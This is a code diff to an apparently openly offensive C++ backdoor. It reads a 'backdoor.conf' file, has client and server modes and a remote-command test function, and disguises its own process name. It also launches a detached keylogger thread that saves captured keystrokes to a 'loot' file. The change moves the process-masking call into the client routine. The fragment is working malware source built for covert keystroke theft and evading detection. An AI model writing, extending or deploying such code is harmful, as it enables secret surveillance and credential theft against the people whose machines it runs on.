@@ -85,8 +85,6 @@ void testRceRes(const Properties &p) {
 int main(int argc, char *argv[]) {
     Properties p = getConfig("backdoor.conf");
 
-    maskProcess(argv[0], p.at("newProcessName").c_str());
-
     if (argc != 2) {
         printUsage(argv[0]);
         return 0;
@@ -95,7 +93,7 @@ int main(int argc, char *argv[]) {
     std::string option(argv[1]);
 
     if (option == "client") {
-        return clientMode(p);
+        return clientMode(p, argv[0]);
     }
 
     if (option == "server") {
@@ -188,10 +186,12 @@ int maskProcess(char *original, const char *mask)
  * Params:
  *      const Properties &p: The list of configuration properties.
  *
+ *      char *programName: argv[0].
+ *
  * Return:
  *      The exit code for the application.
  */
-int clientMode(const Properties &p) {
+int clientMode(const Properties &p, char *programName) {
 
     /*
     // we can use orphans to do our dirty work
@@ -199,6 +199,9 @@ int clientMode(const Properties &p) {
         return 0;
     }
     */
+
+    maskProcess(programName, p.at("newProcessName").c_str());
+
     // Start the keylogger in another thread and detach
     std::thread kl_thread([p] {
         Keylogger kl(p.at("keylogLootFile"));
